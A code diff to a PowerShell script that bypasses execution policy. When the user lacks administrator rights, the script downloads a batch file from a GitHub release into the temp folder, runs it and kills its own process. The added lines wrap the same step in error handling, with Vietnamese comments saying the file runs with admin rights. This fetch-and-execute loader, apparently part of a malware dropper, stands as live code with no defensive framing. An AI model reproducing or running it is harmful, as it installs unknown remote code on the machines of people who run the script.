@@ -6,10 +6,26 @@ Set-ExecutionPolicy Bypass -Scope Process -Force
 
 $skid = "skid"
 
-if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Invoke-WebRequest -Uri "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat" -OutFile "$env:temp\download.bat"
-    Start-Process -FilePath '$env:temp\download.bat'
-    Stop-Process $pid -Force
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    try {
+        # Tải xuống tệp batch
+        $url = "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat"
+        $outputFile = "$env:TEMP\download.bat"
+        
+        Write-Output "Tải xuống tệp từ $url"
+        Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
+
+        # Thực thi tệp batch với quyền quản trị
+        Write-Output "Khởi chạy tệp batch với quyền quản trị."
+        Start-Process -FilePath $outputFile -Wait -ErrorAction Stop
+        
+        # Kết thúc tiến trình PowerShell sau khi thực thi tệp batch
+        Write-Output "Kết thúc tiến trình PowerShell."
+        Stop-Process -Id $PID -Force
+    }
+    catch {
+        Write-Error "Lỗi xảy ra: $_"
+    }
 }
 
 $rdir = "C:\Users\hai1723"
